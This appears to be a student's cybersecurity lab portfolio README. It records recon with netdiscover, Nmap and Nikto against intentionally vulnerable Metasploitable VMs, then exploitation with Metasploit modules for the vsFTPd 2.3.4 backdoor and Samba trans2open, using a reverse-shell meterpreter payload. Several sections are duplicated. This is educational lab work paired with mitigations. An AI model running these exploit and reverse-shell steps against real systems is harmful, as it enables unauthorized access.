# Cybersecurity Labs Portfolio 

Welcome to my hands-on cybersecurity lab portfolio!  
This is where I document everything I'm practicing — from virtual labs to tools like Nmap, Wireshark, Metasploit, and more.

- ## 📚 Table of Contents

## Table of Contents
- [Lab 1: Metasploitable2 Setup](#lab-1-metasploitable2-setup-vulnerable-machine-for-testing)
- [Lab 2: Kali Linux Setup and Reconnaissance](#lab-2-kali-linux-setup-and-reconnaissance)
- [Lab 3: Vulnerability Scanning with Nmap and Nikto](#lab-3-vulnerability-scanning-with-nmap-and-nikto)
- [Lab 4: Exploitation Using Metasploit](#lab-4-exploitation-using-metasploit)
- [What’s Next](#whats-next)

---

# Week 1 – Lab Setup and Initial Reconnaissance

## Objective
- Set up Kali Linux and Metasploitable VMs
- Verify network configuration
- Perform initial host discovery and reconnaissance

---

## 1. Verify Kali Linux IP Address
Screenshot:  
![Kali IP](lab1%20kali%20ip.png)

---

## 2. Verify Metasploitable IP Address
Screenshot:  
![Metasploitable IP](lab1_metasploitable_ip_uname.png.png)

---

## 3. System Information
- Kali uname: ![Kali uname](lab1_kali_ip_uname.png.png)  
- Metasploitable uname: ![Metasploitable uname](lab1_metasploitable_ip_uname.png.png)

---

## 4. Host Discovery
Used netdiscover to identify active hosts in the subnet.  
Screenshot:  
![IP Discovery](Lab1_ip_discovery.png)

---

## 5. Network Reconnaissance
Started scanning the Metasploitable target.  
Screenshots:  
- ![Host Discovery](lab2-host-discovery.png)  
![Host Discovery](Lab1_ip_discovery.png)
- ![Network Reconnaissance](lab2-network-reconnaissance.png)

---

## Summary
In Week 1, I successfully:
- Set up the lab environment (Kali + Metasploitable).
- Verified connectivity and IP addresses.
- Ran initial scans to confirm both machines can communicate.

- ---

### Step 1 – Verify IP Addresses
- Kali IP: 192.168.56.103
- Metasploitable IP: 192.168.56.104
### Step 1 – Verify IP Addresses
- Kali IP: 192.168.56.103
- Metasploitable IP: 192.168.56.104
![Kali IP](week%202_kali_ip.png.png.png)
![Metasploitable IP](week%202_metasploitable.png)

---

### Step 2 – Ping Test
- Kali → Metasploitable (Success: 0% packet loss)
- Metasploitable → Kali (Success: 0% packet loss)

![Kali Ping](week%202_kali_ping.png.png)
![Metasploitable Ping](week%202_kali_ping.png.png)

---

### Step 3 – ARP Table Check
- Verified discovered hosts in ARP table.
- Confirmed that machines can see each other on the same subnet.

![Kali ARP](week%202_kali_arp.png.png)
![Metasploitable ARP](week%202_metasploitable_arp.png.png)

---

### Step 4 – Netdiscover Scan
- Scanned the subnet with Netdiscover.
- Found active hosts: Kali, Metasploitable, and VirtualBox Host-Only Adapter.

![Netdiscover](week%202_netdiscover.png.png)

---

### Step 5 – Nmap Service Scan
- Ran service detection scan (nmap -sV 192.168.56.104).
- Discovered open ports and services (FTP, SSH, MySQL, Apache Tomcat, Samba, etc.).

![Nmap Scan](week%202%20_nmap_scan.png.png)
- Checked ARP tables to validate network visibility.  
- Scanned the subnet with Netdiscover to discover active hosts.  
- Used Nmap to identify open ports and running services on Metasploitable.


---
##  Lab 1: Metasploitable2 Setup (Vulnerable Machine for Testing)

Tool Used: VirtualBox  
System: Metasploitable2 (Ubuntu 2.6.24)  
Status:  Completed

###  What I Did:
- Imported the Metasploitable2 VM into VirtualBox
- Configured network settings (NAT and Host-only for Kali interaction)
- Logged in with default credentials: msfadmin/msfadmin
- Verified system status:
  ```bash
  ip a
  uname -a


## Lab 2: Kali Linux Setup and Reconnaissance  

## 1) Goal  
Set up Kali Linux in VirtualBox and perform basic network reconnaissance to identify the Metasploitable2 target.  

## 2) Environment  
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 (VirtualBox Image)  
- Target: Metasploitable2 (Ubuntu 2.6.24)  
- Network: Host-only (192.168.56.0/24)  

## 3) Steps & Commands  

*What I Did:*  
- Installed Kali Linux VM in VirtualBox  
- Connected it to the same network as Metasploitable2  
- Discovered Metasploitable2’s IP address  

*Verified system status:*
bash
ip a
uname -a


*Network discovery with Netdiscover:*
bash
netdiscover -r 192.168.56.0/24


*Basic Nmap scan:*
bash
nmap -sS [target_IP]


## 4) Results & Screenshots
- ip a confirmed Kali network interface up and running.
- netdiscover revealed Metasploitable2 IP (e.g., 192.168.56.101).
- Nmap detected several open ports (21-FTP, 22-SSH, 23-Telnet, 80-HTTP, 3306-MySQL).

(add screenshots here)

## 5) Findings & Mitigation
- *Telnet (23/tcp)* open → insecure plaintext protocol.  
  Mitigation: Disable Telnet, use SSH instead.  
- *FTP (21/tcp)* allows anonymous login → risk of unauthorized access.  
  Mitigation: Disable anonymous login, enforce authentication.

## 6) Reflection
This lab taught me how to install/configure Kali, connect VMs on host-only, and run recon with netdiscover + Nmap.


## Lab 3: Vulnerability Scanning with Nmap and Nikto

## 1) Goal  
Perform deeper vulnerability scanning by:  
- Using *Nmap* for service and version detection.  
- Running *Nikto* to identify web server vulnerabilities.  

## 2) Environment  
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 VM  
- Target: Metasploitable2 (Ubuntu 2.6.24)  
- Network: Host-only (192.168.56.0/24)  

## 3) Steps & Commands  

*Service and version detection with Nmap:*  
```bash
nmap -sV [target_IP]

Web vulnerability scanning with Nikto:

nikto -h http://[target_IP]


4) Results & Screenshots
	•	Nmap Results:
	•	Detected services and versions (Apache HTTPD 2.x, MySQL, vsFTPd).
	•	Confirmed target is running multiple outdated services.
	•	Nikto Results:
	•	Found potential vulnerabilities (e.g., outdated Apache server, directory indexing enabled, insecure HTTP headers).
	•	Reported multiple findings with severity levels.

 Add screenshots here:
	•	Nmap scan output
	•	Nikto scan results


5) Findings & Mitigation
	•	Apache HTTPD outdated → risk of known exploits.
	•	Mitigation: Upgrade to latest stable Apache version.
	•	Directory indexing enabled → information disclosure.
	•	Mitigation: Disable directory listing in Apache config.
	•	Missing security headers → weak against XSS/Clickjacking.
	•	Mitigation: Add X-Frame-Options, X-Content-Type-Options, CSP headers.


6) Reflection

This lab helped me move from basic reconnaissance (Lab 2) to detailed vulnerability analysis:
	•	Learned how Nmap’s -sV option reveals software versions.
	•	Used Nikto to identify common web vulnerabilities.
	•	Understood how to map results to real-world mitigations.


## Lab 4: Exploitation Using Metasploit

### 1) Goal
Demonstrate exploitation of a vulnerable service (vsFTPd 2.3.4 backdoor) on Metasploitable2 using the Metasploit Framework.

### 2) Environment
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 VM  
- Target: Metasploitable2 (Ubuntu 2.6.24 VM)  
- Tool: Metasploit Framework (msfconsole)  

### 3) Steps & Commands

*Launched Metasploit Framework:*
bash
msfconsole


*Searched for available exploits:*
bash
search vsftpd


*Selected and configured exploit module:*
bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [target_IP]
exploit


*Interacted with the session (if successful):*
bash
sessions -i 1
whoami
uname -a


### 4) Results & Screenshots
- Successfully launched Metasploit and selected the vsFTPd 2.3.4 exploit.  
- Exploit executed → gained remote shell access to Metasploitable2.  
- Verified access using whoami and uname -a.  

Add screenshots here:  
- Metasploit module loaded  
- Exploit success message  
- Proof of shell access on target  

### 5) Findings & Mitigation
- *Finding:* vsFTPd 2.3.4 is vulnerable due to a known backdoor.  
  *Mitigation:* Upgrade or disable the vulnerable FTP service.  
- *Finding:* Exposed FTP service was accessible on the network.  
  *Mitigation:* Restrict access with firewall rules and enforce strong authentication.  

### 6) Reflection
This lab helped me move from basic reconnaissance (Lab 2) to detailed vulnerability analysis:  
- Learned how Nmap’s -sV option reveals software versions.  
- Used Nikto to identify common web vulnerabilities.  
- Understood how to map results to real-world mitigations.  

```

## Lab 4: Exploitation Using Metasploit

### 1) Goal
Demonstrate exploitation of a vulnerable service (vsFTPd 2.3.4 backdoor) on Metasploitable2 using the Metasploit Framework.

### 2) Environment
- Host: Windows 11, VirtualBox 7.x  
- Attacker: Kali Linux 2025.2 VM  
- Target: Metasploitable2 (Ubuntu 2.6.24 VM)  
- Tool: Metasploit Framework (msfconsole)




Stay tuned! 


# Week 3 – Vulnerability Scanning and Exploitation (Metasploitable 3)

## Overview  
This week focused on performing *network reconnaissance* with Nmap and attempting *exploitation* with Metasploit against the Metasploitable 3 target machine. The objective was to identify open ports, detect services, enumerate vulnerabilities, and attempt to exploit Samba.

---

## Steps and Evidence  

### 🔍 1. Full Nmap Scan  
*Screenshot:* week3_scan1_nmap_full.png  
- Performed a full port scan on the target.  
- Identified open ports including *139* and *445 (SMB)*.  

---

### 🔍 2. Nmap Open Ports Scan  
*Screenshot:* week3_scan2_nmap_open_ports.png  
- Verified which ports were open and accessible.  
- Confirmed SMB-related ports.

---

### 🔍 3. Nmap Service Version Detection  
*Screenshot:* week3_scan3_nmap_service_versions.png  
- Ran -sV scan to identify service versions.  
- Found Samba service running on the target.

---

### 🔍 4. Nmap OS Detection  
*Screenshot:* week3_scan4_nmap_os_detection.png  
- Used -O option to detect the operating system.  
- Confirmed target OS type for exploitation attempts.  

---

### 🔍 5. Nmap Vulnerability Scan  
*Screenshot:* week3_scan5_nmap_vuln.png  
- Ran NSE vulnerability scripts on SMB.  
- Confirmed the service was potentially exploitable.  

---

### ⚡ 6. Starting Metasploit Framework  
*Screenshot:* week3_scan6_msfconsole.png  
- Opened msfconsole.  
- Prepared the exploitation phase.  

---

### ⚡ 7. Searching Samba Exploits in Metasploit  
*Screenshot:* week3_scan7_msf_search_samba.png  
- Used search samba command.  
- Listed multiple Samba exploits available in Metasploit.  

---

### ⚡ 8. Setting Target Host (RHOSTS)  
*Screenshot:* week3_scan9_msf_set_rhosts.png  
- Set the target machine IP:  
  ```bash
  set RHOSTS 172.28.128.3


⸻

⚡ 9. Setting Payload

Screenshot: week3_scan10_msf_set_payload.png
	•	Set the payload to establish a reverse shell:

set PAYLOAD linux/x86/meterpreter/reverse_tcp



⸻

⚡ 10. Setting Local Host (LHOST)

Screenshot: week3_scan11_msf_set_lhost.png
	•	Configured the attacker’s local IP for callback:

set LHOST 172.28.128.2



⸻

⚡ 11. Exploit Attempt

Screenshot: use_exploitlinuxsambatrans2open.png
	•	Used a Samba exploit module to attempt remote code execution.
	•	Exploit was launched, but no session was created (target did not open a shell).
	•	This shows that exploitation was attempted but unsuccessful in this configuration.

⸻

✅ Summary
	•	Successfully performed Nmap reconnaissance (ports, services, OS, vulnerabilities).
	•	Attempted Metasploit exploitation on Samba service.
	•	Exploit did not yield a session, but the lab demonstrated the process of moving from scanning → exploitation attempts.

---
 




